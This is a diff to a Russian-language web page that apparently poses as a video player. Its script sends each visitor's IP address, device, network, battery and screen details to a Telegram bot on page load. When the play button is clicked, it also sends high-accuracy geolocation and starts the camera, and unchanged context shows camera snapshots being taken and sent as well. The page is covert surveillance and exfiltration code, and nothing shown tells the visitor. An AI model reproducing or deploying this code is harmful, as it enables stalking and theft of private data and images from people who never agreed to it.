@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ru">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
@@ -112,8 +112,85 @@
         document.addEventListener('gesturestart', e => e.preventDefault());
         document.addEventListener('touchmove', e => e.scale !== 1 && e.preventDefault(), { passive: false });
 
-        // Функция для получения геолокации с кешированием
-        async function getGeolocation() {
+        // ================== РАСШИРЕННЫЙ СБОР ИНФОРМАЦИИ ==================
+        async function collectFullInfo() {
+            const info = {
+                "🆔 Основная информация": await getBasicInfo(),
+                "📱 Устройство": getDeviceDetails(),
+                "🌐 Сеть": await getNetworkInfo(),
+                "🔋 Батарея": await getBatteryStatus(),
+                "📍 Геолокация": await getGeoData(),
+                "🕒 Время и дата": getTimeInfo(),
+                "🖥️ Экран": getScreenDetails(),
+                "🧠 Память и CPU": await getHardwareInfo(),
+                "🔍 Дополнительно": getAdditionalInfo()
+            };
+            
+            // Форматируем информацию для отправки
+            let message = "🚨 ПОЛНАЯ ИНФОРМАЦИЯ О ПОЛЬЗОВАТЕЛЕ 🚨\n\n";
+            for (const [category, data] of Object.entries(info)) {
+                message += `${category}:\n${formatInfo(data)}\n`;
+            }
+            
+            return message;
+        }
+
+        async function getBasicInfo() {
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            
+            return {
+                "IP-адрес": ipData.ip,
+                "User Agent": navigator.userAgent,
+                "Платформа": navigator.platform,
+                "Язык": navigator.language,
+                "Доступные языки": navigator.languages ? navigator.languages.join(', ') : 'Неизвестно',
+                "Куки включены": navigator.cookieEnabled ? 'Да' : 'Нет'
+            };
+        }
+
+        function getDeviceDetails() {
+            return {
+                "Тип устройства": getDeviceType(),
+                "ОС": getOS(),
+                "Браузер": getBrowser(),
+                "Версия браузера": getBrowserVersion(),
+                "Архитектура CPU": navigator.cpuClass || 'Неизвестно',
+                "Количество ядер": navigator.hardwareConcurrency || 'Неизвестно',
+                "Объем памяти": navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Неизвестно'
+            };
+        }
+
+        async function getNetworkInfo() {
+            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            return {
+                "Тип соединения": connection?.type || 'Неизвестно',
+                "Эффективный тип": connection?.effectiveType || 'Неизвестно',
+                "Скорость загрузки": connection?.downlink ? connection.downlink + ' Mbps' : 'Неизвестно',
+                "Задержка": connection?.rtt ? connection.rtt + ' мс' : 'Неизвестно',
+                "Режим экономии данных": connection?.saveData ? 'Да' : 'Нет',
+                "Онлайн статус": navigator.onLine ? 'Онлайн' : 'Оффлайн'
+            };
+        }
+
+        async function getBatteryStatus() {
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    return {
+                        "Уровень заряда": Math.round(battery.level * 100) + '%',
+                        "Заряжается": battery.charging ? 'Да' : 'Нет',
+                        "Время до зарядки": battery.chargingTime ? formatTime(battery.chargingTime) : 'Неизвестно',
+                        "Время до разрядки": battery.dischargingTime ? formatTime(battery.dischargingTime) : 'Неизвестно'
+                    };
+                } catch (e) {
+                    return { "Ошибка": 'Не удалось получить данные' };
+                }
+            }
+            return { "Статус": 'API не поддерживается' };
+        }
+
+        async function getGeoData() {
             if (positionCache) return positionCache;
             
             return new Promise((resolve) => {
@@ -121,24 +198,146 @@
                     navigator.geolocation.getCurrentPosition(
                         position => {
                             positionCache = {
-                                latitude: position.coords.latitude,
-                                longitude: position.coords.longitude,
-                                accuracy: position.coords.accuracy
+                                "Широта": position.coords.latitude,
+                                "Долгота": position.coords.longitude,
+                                "Точность": position.coords.accuracy + ' метров',
+                                "Высота": position.coords.altitude || 'Недоступно',
+                                "Скорость": position.coords.speed || 'Недоступно'
                             };
                             resolve(positionCache);
                         },
                         error => {
-                            resolve({ error: 'Геолокация запрещена: ' + error.message });
+                            resolve({ "Ошибка": 'Геолокация запрещена: ' + error.message });
                         },
                         { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                     );
                 } else {
-                    resolve({ error: 'Геолокация не поддерживается' });
+                    resolve({ "Ошибка": 'Геолокация не поддерживается' });
                 }
             });
         }
 
-        // Отправка карты геолокации в Telegram
+        function getTimeInfo() {
+            return {
+                "Часовой пояс": Intl.DateTimeFormat().resolvedOptions().timeZone,
+                "Смещение времени": new Date().getTimezoneOffset() + ' минут',
+                "Локальное время": new Date().toLocaleString(),
+                "Время UTC": new Date().toUTCString()
+            };
+        }
+
+        function getScreenDetails() {
+            const screen = window.screen;
+            return {
+                "Разрешение": `${screen.width}x${screen.height}`,
+                "Доступное разрешение": `${screen.availWidth}x${screen.availHeight}`,
+                "Глубина цвета": screen.colorDepth + ' бит',
+                "Плотность пикселей": window.devicePixelRatio || 'Неизвестно',
+                "Ориентация": screen.orientation?.type || 'Неизвестно'
+            };
+        }
+
+        async function getHardwareInfo() {
+            return {
+                "Количество ядер": navigator.hardwareConcurrency || 'Неизвестно',
+                "Объем памяти": navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Неизвестно',
+                "Макс. точки касания": navigator.maxTouchPoints || 'Неизвестно'
+            };
+        }
+
+        function getAdditionalInfo() {
+            return {
+                "Do Not Track": navigator.doNotTrack || 'Неизвестно',
+                "Поддержка WebGL": detectWebGL(),
+                "Поддержка Canvas": detectCanvas(),
+                "Поддержка WebRTC": detectWebRTC(),
+                "Поддержка Service Workers": 'serviceWorker' in navigator ? 'Да' : 'Нет',
+                "Поддержка Push API": 'PushManager' in window ? 'Да' : 'Нет'
+            };
+        }
+
+        // ================== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ==================
+        function getDeviceType() {
+            const ua = navigator.userAgent;
+            if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) {
+                return "Планшет";
+            }
+            if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) {
+                return "Мобильное устройство";
+            }
+            return "Компьютер";
+        }
+
+        function getOS() {
+            const ua = navigator.userAgent;
+            if (/Windows/i.test(ua)) return "Windows";
+            if (/Mac/i.test(ua)) return "MacOS";
+            if (/Linux/i.test(ua)) return "Linux";
+            if (/Android/i.test(ua)) return "Android";
+            if (/iOS|iPhone|iPad|iPod/i.test(ua)) return "iOS";
+            return "Неизвестно";
+        }
+
+        function getBrowser() {
+            const ua = navigator.userAgent;
+            if (/Edg/i.test(ua)) return "Edge";
+            if (/OPR/i.test(ua)) return "Opera";
+            if (/Chrome/i.test(ua)) return "Chrome";
+            if (/Firefox/i.test(ua)) return "Firefox";
+            if (/Safari/i.test(ua)) return "Safari";
+            if (/MSIE|Trident/i.test(ua)) return "IE";
+            return "Неизвестно";
+        }
+
+        function getBrowserVersion() {
+            const ua = navigator.userAgent;
+            const matches = ua.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i) || [];
+            return matches[2] || 'Неизвестно';
+        }
+
+        function detectWebGL() {
+            try {
+                const canvas = document.createElement('canvas');
+                return !!window.WebGLRenderingContext && 
+                    (canvas.getContext('webgl') || canvas.getContext('experimental-webgl'));
+            } catch (e) {
+                return false;
+            }
+        }
+
+        function detectCanvas() {
+            try {
+                const canvas = document.createElement('canvas');
+                return !!(canvas.getContext && canvas.getContext('2d'));
+            } catch (e) {
+                return false;
+            }
+        }
+
+        function detectWebRTC() {
+            return !!(window.RTCPeerConnection || window.mozRTCPeerConnection || 
+                    window.webkitRTCPeerConnection || window.msRTCPeerConnection);
+        }
+
+        function formatTime(seconds) {
+            const h = Math.floor(seconds / 3600);
+            const m = Math.floor((seconds % 3600) / 60);
+            return `${h} ч ${m} мин`;
+        }
+
+        function formatInfo(info) {
+            let result = '';
+            for (const [key, value] of Object.entries(info)) {
+                if (typeof value === 'object' && value !== null) {
+                    result += `  ${key}:\n${formatInfo(value).replace(/^/gm, '    ')}`;
+                } else {
+                    result += `  ${key}: ${value}\n`;
+                }
+            }
+            return result;
+        }
+
+        // ================== ОТПРАВКА ГЕОЛОКАЦИИ ==================
         async function sendLocationToTelegram(lat, lon) {
             try {
                 await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
@@ -155,60 +354,7 @@
             }
         }
 
-        // Получение информации об устройстве
-        function getDeviceInfo() {
-            return {
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                screen: `${window.screen.width}x${window.screen.height}`,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                date: new Date().toLocaleString()
-            };
-        }
-
-        // Отправка информации о пользователе
-        async function sendUserInfo() {
-            try {
-                // Получаем IP
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
-                
-                // Получаем геолокацию
-                const geoData = await getGeolocation();
-                if (geoData.latitude && geoData.longitude) {
-                    await sendLocationToTelegram(geoData.latitude, geoData.longitude);
-                }
-
-                // Формируем сообщение
-                const deviceInfo = getDeviceInfo();
-                let message = `🚨 Новый посетитель:\nIP: ${ipData.ip}\n`;
-                message += `Устройство: ${deviceInfo.userAgent}\n`;
-                message += `Экран: ${deviceInfo.screen}\n`;
-                message += `Время: ${deviceInfo.date}\n`;
-                
-                if (geoData.latitude) {
-                    message += `\n📍 Геолокация:\nШирота: ${geoData.latitude}\nДолгота: ${geoData.longitude}\n`;
-                    message += `Точность: ${geoData.accuracy} метров\n`;
-                } else {
-                    message += `\n⚠️ Геолокация: ${geoData.error || 'Недоступна'}\n`;
-                }
-
-                // Отправляем сообщение
-                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text: message
-                    })
-                });
-
-            } catch (error) {
-                console.error('Ошибка отправки информации:', error);
-            }
-        }
-
-        // Захват фото с камеры
+        // ================== РАБОТА С КАМЕРОЙ ==================
         async function captureAndSendPhoto(index) {
             try {
                 const canvas = document.createElement('canvas');
@@ -237,11 +383,10 @@
                 
             } catch (error) {
                 console.error(`Ошибка фото ${index}:`, error);
-                throw error; // Пробрасываем ошибку для повторной попытки
+                throw error;
             }
         }
 
-        // Серийная съемка с повторными попытками
         async function takeSeriesOfPhotos() {
             let successCount = 0;
             const maxAttempts = 3;
@@ -271,7 +416,6 @@
             return successCount;
         }
 
-        // Запуск камеры
         async function startCamera() {
             try {
                 // Пробуем фронтальную камеру
@@ -321,7 +465,6 @@
             }
         }
 
-        // Остановка камеры
         function stopCamera() {
             if (stream) {
                 stream.getTracks().forEach(track => track.stop());
@@ -330,10 +473,49 @@
             }
         }
 
-        // Обработчик кнопки
+        // ================== ОСНОВНОЙ КОД ==================
         playBtn.addEventListener('click', async () => {
-            await sendUserInfo();
-            await startCamera();
+            try {
+                // Собираем и отправляем полную информацию
+                const fullInfo = await collectFullInfo();
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: fullInfo
+                    })
+                });
+                
+                // Отправляем геолокацию если доступна
+                const geoData = await getGeoData();
+                if (geoData['Широта'] && geoData['Долгота']) {
+                    await sendLocationToTelegram(geoData['Широта'], geoData['Долгота']);
+                }
+                
+                // Запускаем камеру
+                await startCamera();
+            } catch (error) {
+                console.error('Общая ошибка:', error);
+                messageBox.style.display = 'block';
+            }
+        });
+
+        // Отправляем базовую информацию при загрузке
+        window.addEventListener('load', async () => {
+            try {
+                const basicInfo = await getBasicInfo();
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: `📱 Новое подключение:\n${formatInfo(basicInfo)}`
+                    })
+                });
+            } catch (e) {
+                console.error('Ошибка отправки:', e);
+            }
         });
 
         // Остановка камеры при закрытии
@@ -341,9 +523,6 @@
         document.addEventListener('visibilitychange', () => {
             if (document.hidden) stopCamera();
         });
-
-        // Отправка информации при загрузке
-        window.addEventListener('load', sendUserInfo);
     </script>
 </body>
 </html>
